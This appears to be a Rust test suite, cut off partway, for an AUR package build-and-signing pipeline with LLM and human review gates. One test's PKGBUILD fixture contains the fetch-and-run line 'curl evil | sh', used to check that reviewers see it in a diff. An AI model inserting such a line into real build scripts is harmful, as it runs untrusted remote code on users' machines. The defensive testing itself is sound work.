//! 端到端测试：订阅 → 审查 → 人工门禁 → 构建租约 → 分片上传 → 期望状态发布 → 无网络签名器。
//! 签名器相关测试需要 gpg、bsdtar、repo-add、makepkg（Arch 或安装了 pacman-package-manager 的 Debian）。

use crate::{
    admin,
    app::AppState,
    aur::{AurClient, Snapshot, SnapshotFile},
    builds, config, db,
    packages::{ResolvedDependency, insert_revision},
    publish,
    review::{self, Reviewer},
    routes, signer, state,
};
use aursmith_core::{
    protocol::{ArtifactRecord, BuildSpec, LeaseResponse, SignerResult, SignerState},
    review::Outcome,
    sha256_hex,
    srcinfo::parse_srcinfo,
};
use axum::{
    Router,
    body::{Body, Bytes},
    http::{Request, StatusCode, header},
};
use base64::{Engine, engine::general_purpose::STANDARD as BASE64};
use serde_json::{Value, json};
use sqlx::Connection;
use std::{
    collections::BTreeMap,
    path::{Path, PathBuf},
    process::Command,
    sync::{Arc, Mutex},
};
use tempfile::TempDir;
use tower::ServiceExt;

const PASSWORD: &str = "足够长的测试密码-123456";
const ORIGIN: &str = "https://aursmith.example";

struct Fixture {
    root: TempDir,
    state: AppState,
    app: Router,
}

async fn fixture(reviewer: Option<Reviewer>) -> Fixture {
    let root = tempfile::tempdir().unwrap();
    let config = config::test_config(root.path());
    std::fs::create_dir_all(&config.web_root).unwrap();
    std::fs::write(config.web_root.join("index.html"), "<html>aursmith</html>").unwrap();
    for directory in [
        config.data_dir.join("artifacts"),
        config.exchange_dir.join("inbox"),
        config.exchange_dir.join("outbox"),
    ] {
        std::fs::create_dir_all(directory).unwrap();
    }
    let database = db::connect(&config.database_url).await.unwrap();
    admin::init(&database, "admin", PASSWORD).await.unwrap();
    let state = AppState::new(
        database,
        config,
        AurClient::new("https://aur.archlinux.org/", None).unwrap(),
        reviewer,
    );
    let app = routes::router(state.clone());
    Fixture { root, state, app }
}

fn snapshot(base: &str, aur_commit: char, vcs_commit: Option<&str>, pkgbuild: &str) -> Snapshot {
    let srcinfo = format!(
        "pkgbase = {base}\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = x86_64\n\npkgname = {base}\n"
    );
    let file = |path: &str, text: &str| SnapshotFile {
        path: path.into(),
        sha256: sha256_hex(text.as_bytes()),
        size: text.len() as u64,
        binary: false,
        content_base64: BASE64.encode(text),
    };
    Snapshot {
        package_base: base.into(),
        aur_commit: aur_commit.to_string().repeat(40),
        vcs_commit: vcs_commit.map(str::to_owned),
        info: parse_srcinfo(base, &srcinfo).unwrap(),
        files: vec![file(".SRCINFO", &srcinfo), file("PKGBUILD", pkgbuild)],
    }
}

async fn call(
    app: &Router,
    method: &str,
    uri: &str,
    cookie: Option<&str>,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let mut request = Request::builder()
        .method(method)
        .uri(uri)
        .header("origin", ORIGIN)
        .header("x-aursmith-csrf", "1")
        .header(header::CONTENT_TYPE, "application/json");
    if let Some(cookie) = cookie {
        request = request.header(header::COOKIE, cookie);
    }
    let response = app
        .clone()
        .oneshot(
            request
                .body(body.map_or_else(Body::empty, |body| Body::from(body.to_string())))
                .unwrap(),
        )
        .await
        .unwrap();
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    (
        status,
        serde_json::from_slice(&bytes).unwrap_or(Value::Null),
    )
}

async fn builder_call(
    app: &Router,
    method: &str,
    uri: &str,
    body: Body,
    token: &str,
) -> (StatusCode, Value) {
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .method(method)
                .uri(uri)
                .header(header::AUTHORIZATION, format!("Bearer {token}"))
                .header(header::CONTENT_TYPE, "application/json")
                .body(body)
                .unwrap(),
        )
        .await
        .unwrap();
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    (
        status,
        serde_json::from_slice(&bytes).unwrap_or(Value::Null),
    )
}

async fn login(app: &Router) -> String {
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/auth/login")
                .header("origin", ORIGIN)
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(
                    json!({"username": "admin", "password": PASSWORD}).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    response.headers()[header::SET_COOKIE]
        .to_str()
        .unwrap()
        .split(';')
        .next()
        .unwrap()
        .to_owned()
}

fn fixture_package(directory: &Path, name: &str, version: &str) -> (PathBuf, ArtifactRecord) {
    let source = directory.join(format!("pkg-{name}-{version}"));
    std::fs::create_dir_all(&source).unwrap();
    std::fs::write(
        source.join(".PKGINFO"),
        format!("pkgname = {name}\npkgver = {version}\narch = x86_64\n"),
    )
    .unwrap();
    let file = format!("{name}-{version}-x86_64.pkg.tar.zst");
    let package = directory.join(&file);
    let status = Command::new("/usr/bin/bsdtar")
        .arg("-cf")
        .arg(&package)
        .arg("-C")
        .arg(&source)
        .arg(".PKGINFO")
        .status()
        .unwrap();
    assert!(status.success());
    let bytes = std::fs::read(&package).unwrap();
    let record = ArtifactRecord {
        file,
        sha256: sha256_hex(&bytes),
        size: bytes.len() as u64,
        package_name: name.into(),
        package_version: version.into(),
        architecture: "x86_64".into(),
    };
    (package, record)
}

fn generate_key(home: &Path) {
    std::fs::create_dir_all(home).unwrap();
    let status = Command::new("/usr/bin/gpg")
        .arg("--homedir")
        .arg(home)
        .args([
            "--batch",
            "--passphrase",
            "",
            "--quick-gen-key",
            "AURsmith Test <test@aursmith.invalid>",
            "ed25519",
            "sign",
            "0",
        ])
        .stderr(std::process::Stdio::null())
        .status()
        .unwrap();
    assert!(status.success());
}

async fn approve(fixture: &Fixture, cookie: &str, revision_id: &str) {
    let (status, body) = call(
        &fixture.app,
        "POST",
        &format!("/api/v1/revisions/{revision_id}/decision"),
        Some(cookie),
        Some(json!({"approve": true, "rationale": "人工核对 PKGBUILD 与 .SRCINFO 无问题"})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 租约 → 回报 → 分两片上传 → 完成。
async fn build_and_upload(fixture: &Fixture, package_dir: &Path, version: &str) -> BuildSpec {
    let (status, body) = builder_call(
        &fixture.app,
        "POST",
        "/api/v1/builder/lease",
        Body::from(json!({"builder_id": "home", "lease_seconds": 3600}).to_string()),
        "builder-token",
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let spec = serde_json::from_value::<LeaseResponse>(body)
        .unwrap()
        .build
        .expect("应该租到构建");
    let (package, record) = fixture_package(package_dir, "demo", version);
    let (status, body) = builder_call(&fixture.app, "POST", &format!("/api/v1/builder/builds/{}/report", spec.build_id), Body::from(json!({
        "attempt": spec.attempt, "outcome": "succeeded", "artifacts": [record], "error_code": null, "log": "ok", "log_truncated": false
    }).to_string()), "builder-token").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let bytes = std::fs::read(package).unwrap();
    let half = bytes.len() / 2;
    let uri = format!(
        "/api/v1/builder/builds/{}/files/{}",
        spec.build_id, record.file
    );
    let (status, _) = builder_call(
        &fixture.app,
        "PUT",
        &format!("{uri}?offset=7"),
        Body::from(bytes[..half].to_vec()),
        "builder-token",
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "偏移不匹配必须拒绝");
    let (status, body) = builder_call(
        &fixture.app,
        "PUT",
        &format!("{uri}?offset=0"),
        Body::from(bytes[..half].to_vec()),
        "builder-token",
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["received"], half);
    let (status, _) = builder_call(
        &fixture.app,
        "POST",
        &format!("/api/v1/builder/builds/{}/complete", spec.build_id),
        Body::empty(),
        "builder-token",
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "上传未完成不能 complete");
    let (status, body) = builder_call(
        &fixture.app,
        "PUT",
        &format!("{uri}?offset={half}"),
        Body::from(Bytes::from(bytes[half..].to_vec())),
        "builder-token",
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["complete"], true);
    let (status, body) = builder_call(
        &fixture.app,
        "POST",
        &format!("/api/v1/builder/builds/{}/complete", spec.build_id),
        Body::empty(),
        "builder-token",
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    spec
}

#[tokio::test]
async fn management_api_enforces_session_origin_and_csrf() {
    let fixture = fixture(None).await;
    let (status, _) = call(&fixture.app, "GET", "/api/v1/subscriptions", None, None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let cookie = login(&fixture.app).await;
    let (status, body) = call(&fixture.app, "GET", "/api/v1/auth/me", Some(&cookie), None).await;
    assert_eq!(
        (status, body["username"].as_str()),
        (StatusCode::OK, Some("admin"))
    );
    let response = fixture
        .app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/packages/x/rebuild")
                .header(header::COOKIE, &cookie)
                .header("origin", ORIGIN)
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::FORBIDDEN, "缺少 CSRF 头");
    let response = fixture
        .app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/packages/x/rebuild")
                .header(header::COOKIE, &cookie)
                .header("origin", "https://evil.example")
                .header("x-aursmith-csrf", "1")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::FORBIDDEN, "Origin 不受信任");
    let (status, _) = call(
        &fixture.app,
        "GET",
        "/api/v1/no-such-endpoint",
        Some(&cookie),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, _) = builder_call(
        &fixture.app,
        "POST",
        "/api/v1/builder/lease",
        Body::from(json!({"builder_id": "home", "lease_seconds": 600}).to_string()),
        "wrong-token",
    )
    .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, body) = call(&fixture.app, "GET", "/api/v1/status", Some(&cookie), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        body["ready"], false,
        "未配置审查、未见 Builder 时不应 ready"
    );
    let (status, _) = call(
        &fixture.app,
        "POST",
        "/api/v1/auth/logout",
        Some(&cookie),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (status, _) = call(&fixture.app, "GET", "/api/v1/auth/me", Some(&cookie), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn full_pipeline_from_revision_to_signed_repository_and_rollback() {
    let fixture = fixture(None).await;
    let cookie = login(&fixture.app).await;
    let db = &fixture.state.db;
    let packages = fixture.root.path().join("packages");
    std::fs::create_dir_all(&packages).unwrap();

    // 首次加入：没有 baseline，未配置 Agent → 人工审查。
    let first = snapshot("demo", 'a', None, "pkgname=demo\npackage() { :; }\n");
    let (revision_id, revision_state) = insert_revision(db, &first, &[]).await.unwrap().unwrap();
    assert_eq!(revision_state, "pending_review");
    assert!(
        insert_revision(db, &first, &[]).await.unwrap().is_none(),
        "相同 revision 幂等"
    );
    sqlx::query("INSERT INTO subscriptions(package_base, created_at) VALUES ('demo', '2026-01-01T00:00:00Z')").execute(db).await.unwrap();
    assert_eq!(
        review::review_next(&fixture.state).await.unwrap(),
        Some((revision_id.clone(), Outcome::ManualReview))
    );
    let (_, reviews) = call(&fixture.app, "GET", "/api/v1/reviews", Some(&cookie), None).await;
    assert_eq!(reviews["items"][0]["state"], "manual_review");
    assert_eq!(reviews["items"][0]["first_time"], true);
    let (status, _) = call(
        &fixture.app,
        "POST",
        &format!("/api/v1/revisions/{revision_id}/decision"),
        Some(&cookie),
        Some(json!({"approve": true, "rationale": "短"})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    approve(&fixture, &cookie, &revision_id).await;

    // 调和：排队构建；构建进行中不发布。
    assert!(!publish::reconcile(&fixture.state).await.unwrap());
    let spec = build_and_upload(&fixture, &packages, "1-1").await;
    assert_eq!(spec.expected_outputs, vec!["demo"]);
    assert_eq!(spec.files.len(), 2);
    assert!(spec.dependencies.is_empty());

    // 期望状态 → inbox。
    assert!(publish::reconcile(&fixture.state).await.unwrap());
    let inbox = fixture.state.config.exchange_dir.join("inbox");
    let plans: Vec<_> = std::fs::read_dir(&inbox)
        .unwrap()
        .filter_map(Result::ok)
        .collect();
    assert_eq!(plans.len(), 1);
    assert!(
        plans[0]
            .path()
            .join("demo-1-1-x86_64.pkg.tar.zst")
            .is_file()
    );
    assert!(
        !publish::reconcile(&fixture.state).await.unwrap(),
        "已有待签名计划时不重复写出"
    );

    // 无网络签名器。
    let gpg_home = fixture.root.path().join("gnupg");
    generate_key(&gpg_home);
    let repository = fixture.root.path().join("repo");
    let signer = signer::Signer::with_home(
        fixture.state.config.exchange_dir.clone(),
        repository.clone(),
        gpg_home,
    )
    .unwrap();
    assert_eq!(signer.process_inbox().unwrap(), 1);
    let outbox = std::fs::read_dir(fixture.state.config.exchange_dir.join("outbox"))
        .unwrap()
        .next()
        .unwrap()
        .unwrap();
    let result: SignerResult =
        serde_json::from_slice(&std::fs::read(outbox.path()).unwrap()).unwrap();
    assert_eq!(result.state, SignerState::Published, "{:?}", result.error);
    let arch = repository.join("x86_64");
    assert!(arch.join("aursmith.db").is_symlink());
    assert!(arch.join("demo-1-1-x86_64.pkg.tar.zst.sig").is_file());
    assert!(arch.join("aursmith-repository-key.asc").is_file());
    let first_release = std::fs::read_link(arch.join("releases/current")).unwrap();
    assert!(
        std::fs::read_dir(&arch)
            .unwrap()
            .filter_map(Result::ok)
            .any(|entry| entry
                .file_name()
                .to_string_lossy()
                .starts_with("aursmith-keyring-1:"))
    );

    assert!(
        !publish::reconcile(&fixture.state).await.unwrap(),
        "收敛后不再发布"
    );
    let (_, publications) = call(
        &fixture.app,
        "GET",
        "/api/v1/publications",
        Some(&cookie),
        None,
    )
    .await;
    assert_eq!(publications["items"][0]["state"], "published");
    assert_eq!(publications["items"][0]["current"], true);
    let (status, bootstrap) = call(
        &fixture.app,
        "GET",
        "/api/v1/client-bootstrap",
        Some(&cookie),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(bootstrap["gpg_fingerprint"], signer.fingerprint.as_str());

    // VCS 上游前进、AUR 包装层不变：复用审查直接批准，构建新版本并发布。
    let second = snapshot(
        "demo",
        'a',
        Some(&"b".repeat(40)),
        "pkgname=demo\npackage() { :; }\n",
    );
    let (_, second_state) = insert_revision(db, &second, &[]).await.unwrap().unwrap();
    assert_eq!(second_state, "approved");
    assert!(!publish::reconcile(&fixture.state).await.unwrap());
    build_and_upload(&fixture, &packages, "2-1").await;
    assert!(publish::reconcile(&fixture.state).await.unwrap());
    assert_eq!(signer.process_inbox().unwrap(), 1);
    publish::collect_signer_results(&fixture.state)
        .await
        .unwrap();
    assert!(arch.join("demo-2-1-x86_64.pkg.tar.zst").is_file());
    assert!(
        arch.join("demo-1-1-x86_64.pkg.tar.zst").is_file(),
        "previous release 引用的文件保留"
    );
    assert_eq!(
        std::fs::read_link(arch.join("releases/previous")).unwrap(),
        first_release
    );

    // 紧急回滚。
    let rolled_back = signer.rollback().unwrap();
    assert_eq!(PathBuf::from(&rolled_back), first_release);
    assert_eq!(
        std::fs::read_link(arch.join("releases/current")).unwrap(),
        first_release
    );
    let db_target = std::fs::read_link(arch.join("aursmith.db")).unwrap();
    assert!(db_target.starts_with(Path::new("releases").join(&first_release)));

    // 退订：期望状态变为只剩 keyring。
    let (status, body) = call(
        &fixture.app,
        "DELETE",
        "/api/v1/subscriptions/demo",
        Some(&cookie),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["removed_package_bases"], json!(["demo"]));
    assert!(publish::reconcile(&fixture.state).await.unwrap());
    signer.process_inbox().unwrap();
    publish::collect_signer_results(&fixture.state)
        .await
        .unwrap();
    let latest: String =
        sqlx::query_scalar("SELECT state FROM publications ORDER BY created_at DESC LIMIT 1")
            .fetch_one(db)
            .await
            .unwrap();
    assert_eq!(latest, "published");
}

#[tokio::test]
async fn deterministic_scan_block_rejects_without_agents() {
    let fixture = fixture(None).await;
    let mut bad = snapshot("evil", 'c', None, "pkgname=evil\n");
    bad.files[1].sha256 = "0".repeat(64);
    let (_, state) = insert_revision(&fixture.state.db, &bad, &[])
        .await
        .unwrap()
        .unwrap();
    assert_eq!(state, "rejected");
}

#[tokio::test]
async fn expired_leases_retry_twice_then_fail() {
    let fixture = fixture(None).await;
    let cookie = login(&fixture.app).await;
    let (revision_id, _) =
        insert_revision(&fixture.state.db, &snapshot("demo", 'a', None, "x\n"), &[])
            .await
            .unwrap()
            .unwrap();
    sqlx::query("INSERT INTO subscriptions(package_base, created_at) VALUES ('demo', '2026-01-01T00:00:00Z')").execute(&fixture.state.db).await.unwrap();
    review::review_next(&fixture.state).await.unwrap();
    approve(&fixture, &cookie, &revision_id).await;
    publish::reconcile(&fixture.state).await.unwrap();
    for expected_attempt in 1..=3 {
        let (status, body) = builder_call(
            &fixture.app,
            "POST",
            "/api/v1/builder/lease",
            Body::from(json!({"builder_id": "home", "lease_seconds": 600}).to_string()),
            "builder-token",
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        let spec = serde_json::from_value::<LeaseResponse>(body)
            .unwrap()
            .build
            .unwrap();
        assert_eq!(spec.attempt, expected_attempt);
        sqlx::query("UPDATE builds SET lease_expires_at = '2000-01-01T00:00:00Z'")
            .execute(&fixture.state.db)
            .await
            .unwrap();
        builds::expire_leases(&fixture.state).await.unwrap();
    }
    let (state, class): (String, String) = sqlx::query_as("SELECT state, error_class FROM builds")
        .fetch_one(&fixture.state.db)
        .await
        .unwrap();
    assert_eq!((state.as_str(), class.as_str()), ("failed", "transient"));
}

#[tokio::test]
async fn deterministic_build_failure_is_not_retried_and_bad_outputs_are_rejected() {
    let fixture = fixture(None).await;
    let cookie = login(&fixture.app).await;
    let (revision_id, _) =
        insert_revision(&fixture.state.db, &snapshot("demo", 'a', None, "x\n"), &[])
            .await
            .unwrap()
            .unwrap();
    sqlx::query("INSERT INTO subscriptions(package_base, created_at) VALUES ('demo', '2026-01-01T00:00:00Z')").execute(&fixture.state.db).await.unwrap();
    review::review_next(&fixture.state).await.unwrap();
    approve(&fixture, &cookie, &revision_id).await;
    publish::reconcile(&fixture.state).await.unwrap();
    let (_, body) = builder_call(
        &fixture.app,
        "POST",
        "/api/v1/builder/lease",
        Body::from(json!({"builder_id": "home", "lease_seconds": 600}).to_string()),
        "builder-token",
    )
    .await;
    let spec = serde_json::from_value::<LeaseResponse>(body)
        .unwrap()
        .build
        .unwrap();
    let wrong = ArtifactRecord {
        file: "other-1-1-x86_64.pkg.tar.zst".into(),
        sha256: "a".repeat(64),
        size: 1,
        package_name: "other".into(),
        package_version: "1-1".into(),
        architecture: "x86_64".into(),
    };
    let (status, _) = builder_call(&fixture.app, "POST", &format!("/api/v1/builder/builds/{}/report", spec.build_id), Body::from(json!({
        "attempt": spec.attempt, "outcome": "succeeded", "artifacts": [wrong], "error_code": null, "log": "", "log_truncated": false
    }).to_string()), "builder-token").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (state, code): (String, String) = sqlx::query_as("SELECT state, error_code FROM builds")
        .fetch_one(&fixture.state.db)
        .await
        .unwrap();
    assert_eq!(
        (state.as_str(), code.as_str()),
        ("failed", "OUTPUT_MISMATCH")
    );
    let (status, _) = call(
        &fixture.app,
        "POST",
        "/api/v1/packages/demo/rebuild",
        Some(&cookie),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let (_, body) = builder_call(
        &fixture.app,
        "POST",
        "/api/v1/builder/lease",
        Body::from(json!({"builder_id": "home", "lease_seconds": 600}).to_string()),
        "builder-token",
    )
    .await;
    let spec = serde_json::from_value::<LeaseResponse>(body)
        .unwrap()
        .build
        .unwrap();
    let (status, body) = builder_call(&fixture.app, "POST", &format!("/api/v1/builder/builds/{}/report", spec.build_id), Body::from(json!({
        "attempt": spec.attempt, "outcome": "failed", "artifacts": [], "error_code": "GUEST_CHECKSUM_FAILED", "log": "==> ERROR", "log_truncated": false
    }).to_string()), "builder-token").await;
    assert_eq!(
        (status, body["state"].as_str()),
        (StatusCode::OK, Some("failed"))
    );
    let (_, logs) = call(
        &fixture.app,
        "GET",
        &format!("/api/v1/builds/{}/log", spec.build_id),
        Some(&cookie),
        None,
    )
    .await;
    assert_eq!(logs["log"], "==> ERROR");
}

#[tokio::test]
async fn dependencies_wait_for_provider_choice_and_dependency_builds() {
    let fixture = fixture(None).await;
    let db = &fixture.state.db;
    let app_deps = vec![
        ResolvedDependency {
            name: "libfoo".into(),
            kind: "runtime".into(),
            state: "aur".into(),
            target: Some("libfoo".into()),
            candidates: vec![],
        },
        ResolvedDependency {
            name: "virtual".into(),
            kind: "build".into(),
            state: "needs_selection".into(),
            target: None,
            candidates: vec!["impl-a".into(), "impl-b".into()],
        },
    ];
    let (app_revision, _) = insert_revision(db, &snapshot("app", 'a', None, "x\n"), &app_deps)
        .await
        .unwrap()
        .unwrap();
    let (lib_revision, _) = insert_revision(db, &snapshot("libfoo", 'b', None, "y\n"), &[])
        .await
        .unwrap()
        .unwrap();
    sqlx::query("UPDATE revisions SET state = 'approved'")
        .execute(db)
        .await
        .unwrap();
    sqlx::query("INSERT INTO subscriptions(package_base, created_at) VALUES ('app', '2026-01-01T00:00:00Z')").execute(db).await.unwrap();
    let closure = crate::packages::compute_closure(db).await.unwrap();
    assert!(closure.members.contains("libfoo"));
    assert_eq!(closure.unresolved["app"], vec!["virtual"]);
    publish::reconcile(&fixture.state).await.unwrap();
    let reason = builds::dependency_builds(&fixture.state, &closure, "app")
        .await
        .unwrap()
        .unwrap_err();
    assert!(reason.contains("provider"), "{reason}");
    let cookie = login(&fixture.app).await;
    let (status, _) = call(
        &fixture.app,
        "POST",
        "/api/v1/packages/app/providers/virtual",
        Some(&cookie),
        Some(json!({"selected_package_base": "impl-x"})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "非候选 provider 必须拒绝");
    let (status, _) = call(
        &fixture.app,
        "POST",
        "/api/v1/packages/app/providers/virtual",
        Some(&cookie),
        Some(json!({"selected_package_base": "impl-a"})),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let closure = crate::packages::compute_closure(db).await.unwrap();
    assert!(closure.members.contains("impl-a"));
    let reason = builds::dependency_builds(&fixture.state, &closure, "app")
        .await
        .unwrap()
        .unwrap_err();
    assert!(reason.contains("等待依赖"), "{reason}");
    // libfoo 先被租出；app 依赖未就绪不会被租出。
    let (_, body) = builder_call(
        &fixture.app,
        "POST",
        "/api/v1/builder/lease",
        Body::from(json!({"builder_id": "home", "lease_seconds": 600}).to_string()),
        "builder-token",
    )
    .await;
    let spec = serde_json::from_value::<LeaseResponse>(body)
        .unwrap()
        .build
        .unwrap();
    assert_eq!(spec.revision_id, lib_revision);
    let (_, body) = builder_call(
        &fixture.app,
        "POST",
        "/api/v1/builder/lease",
        Body::from(json!({"builder_id": "home", "lease_seconds": 600}).to_string()),
        "builder-token",
    )
    .await;
    assert!(
        serde_json::from_value::<LeaseResponse>(body)
            .unwrap()
            .build
            .is_none(),
        "app 的依赖尚未构建: {app_revision}"
    );
}

// ------------------------------------------------------------------ 2+1 审查

type Script = Arc<Mutex<BTreeMap<String, String>>>;

async fn mock_llm(script: Script, calls: Arc<Mutex<Vec<String>>>) -> String {
    use axum::{Json, routing::post};
    let openai = {
        let (script, calls) = (script.clone(), calls.clone());
        move |Json(body): Json<Value>| async move {
            let model = body["model"].as_str().unwrap().to_owned();
            assert_eq!(body["response_format"]["json_schema"]["strict"], true);
            calls.lock().unwrap().push(model.clone());
            let content = script.lock().unwrap().get(&model).cloned().unwrap();
            Json(json!({"choices": [{"message": {"content": content}}]}))
        }
    };
    let anthropic = move |Json(body): Json<Value>| async move {
        let model = body["model"].as_str().unwrap().to_owned();
        assert_eq!(body["tool_choice"]["name"], "submit_review");
        calls.lock().unwrap().push(model.clone());
        let content = script.lock().unwrap().get(&model).cloned().unwrap();
        let input: Value = serde_json::from_str(&content).unwrap_or(json!({"broken": true}));
        Json(json!({"content": [{"type": "tool_use", "name": "submit_review", "input": input}]}))
    };
    let app = Router::new()
        .route("/v1/chat/completions", post(openai))
        .route("/v1/messages", post(anthropic));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    format!("http://{address}/v1")
}

fn verdict(verdict: &str) -> String {
    json!({"verdict": verdict, "summary": format!("{verdict} summary"), "findings": [], "files_read": ["PKGBUILD"]}).to_string()
}

async fn review_case(
    first_time: bool,
    low_a: &str,
    low_b: &str,
    high: &str,
) -> (Outcome, Vec<String>) {
    let script: Script = Arc::new(Mutex::new(BTreeMap::from([
        ("low-a".to_owned(), low_a.to_owned()),
        ("low-b".to_owned(), low_b.to_owned()),
        ("high".to_owned(), high.to_owned()),
    ])));
    let calls = Arc::new(Mutex::new(Vec::new()));
    let base = mock_llm(script, calls.clone()).await;
    let keys = tempfile::tempdir().unwrap();
    std::fs::write(keys.path().join("key"), "test-key\n").unwrap();
    let model = |api: &str, name: &str| json!({"api": api, "base_url": base, "model": name, "api_key_file": keys.path().join("key")});
    let config: review::ReviewConfig = serde_json::from_value(json!({
        "timeout_seconds": 30,
        "low": [model("openai", "low-a"), model("anthropic", "low-b")],
        "high": model("openai", "high"),
    }))
    .unwrap();
    let fixture = fixture(Some(Reviewer::from_config(config).unwrap())).await;
    if !first_time {
        insert_revision(
            &fixture.state.db,
            &snapshot("demo", 'a', None, "old\n"),
            &[],
        )
        .await
        .unwrap();
        sqlx::query("UPDATE revisions SET state = 'approved'")
            .execute(&fixture.state.db)
            .await
            .unwrap();
    }
    let (revision, _) = insert_revision(
        &fixture.state.db,
        &snapshot("demo", 'b', None, "new\n"),
        &[],
    )
    .await
    .unwrap()
    .unwrap();
    let (reviewed, outcome) = review::review_next(&fixture.state).await.unwrap().unwrap();
    assert_eq!(reviewed, revision);
    let rows: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM reviews WHERE kind = 'agent'")
        .fetch_one(&fixture.state.db)
        .await
        .unwrap();
    let mut calls = calls.lock().unwrap().clone();
    calls.sort();
    assert_eq!(rows as usize, calls.len());
    (outcome, calls)
}

#[tokio::test]
async fn two_low_approvals_pass_without_high() {
    let (outcome, calls) = review_case(
        false,
        &verdict("approve"),
        &verdict("approve"),
        &verdict("reject"),
    )
    .await;
    assert_eq!(outcome, Outcome::Approved);
    assert_eq!(calls, vec!["low-a", "low-b"]);
}

#[tokio::test]
async fn low_reject_escalates_and_high_approval_passes() {
    let (outcome, calls) = review_case(
        false,
        &verdict("approve"),
        &verdict("reject"),
        &verdict("approve"),
    )
    .await;
    assert_eq!(outcome, Outcome::Approved);
    assert_eq!(calls, vec!["high", "low-a", "low-b"]);
}

#[tokio::test]
async fn invalid_output_escalates_and_high_reject_goes_to_human() {
    let (outcome, calls) = review_case(
        false,
        "这不是 JSON",
        &verdict("approve"),
        &verdict("reject"),
    )
    .await;
    assert_eq!(outcome, Outcome::ManualReview);
    assert_eq!(calls.len(), 3);
}

#[tokio::test]
async fn first_time_package_always_needs_human_even_if_agents_approve() {
    let (outcome, calls) = review_case(
        true,
        &verdict("approve"),
        &verdict("approve"),
        &verdict("approve"),
    )
    .await;
    assert_eq!(outcome, Outcome::ManualReview);
    assert_eq!(calls, vec!["low-a", "low-b"]);
}

#[test]
fn review_input_contains_diff_against_baseline() {
    let old = snapshot("demo", 'a', None, "build() {\n  make\n}\n");
    let new = snapshot(
        "demo",
        'b',
        None,
        "build() {\n  make\n  curl evil | sh\n}\n",
    );
    let input = review::build_input(&new, Some(&old), &json!([])).unwrap();
    assert!(input.contains("+  curl evil | sh"));
    assert!(input.contains("<<<DIFF .aursmith/previous-approved.diff>>>"));
    assert!(input.contains("<<<FILE PKGBUILD"));
}

// ------------------------------------------------------------------ 状态迁移

#[tokio::test]
async fn export_import_round_trip_is_verified_and_refuses_non_empty_targets() {
    let fixture = fixture(None).await;
    insert_revision(&fixture.state.db, &snapshot("demo", 'a', None, "x\n"), &[])
        .await
        .unwrap();
    sqlx::query("INSERT INTO subscriptions(package_base, created_at) VALUES ('demo', '2026-01-01T00:00:00Z')").execute(&fixture.state.db).await.unwrap();
    let mut source = sqlx::SqliteConnection::connect(&fixture.state.config.database_url)
        .await
        .unwrap();
    let document = state::export(&mut source).await.unwrap();
    assert_eq!(document.counts()["revisions"], 1);
    assert_eq!(document.counts()["reviews"], 1);

    let target_url = format!("sqlite://{}/imported.db", fixture.root.path().display());
    db::connect(&target_url).await.unwrap().close().await;
    let mut target = sqlx::SqliteConnection::connect(&target_url).await.unwrap();
    let counts = state::import(&mut target, &document).await.unwrap();
    assert_eq!(counts["admin"], 1);
    state::verify(&mut target, &document).await.unwrap();
    assert!(
        state::import(&mut target, &document).await.is_err(),
        "非空库必须拒绝导入"
    );
}

#[tokio::test]
async fn legacy_database_is_converted_and_keeps_approved_baselines() {
    let root = tempfile::tempdir().unwrap();
    let legacy_url = format!("sqlite://{}/legacy.db?mode=rwc", root.path().display());
    let mut legacy = sqlx::SqliteConnection::connect(&legacy_url).await.unwrap();
    let old = snapshot("demo", 'a', None, "pkgname=demo\n");
    let srcinfo = old.files[0].clone();
    let metadata = json!({
        "package_base": "demo", "aur_commit": old.aur_commit, "vcs_commit": null, "version": "1-1",
        "outputs": ["demo"], "dependencies": [], "optional_dependencies": [], "provides": [], "architectures": ["x86_64"], "sources": [],
        "srcinfo": String::from_utf8(BASE64.decode(&srcinfo.content_base64).unwrap()).unwrap(),
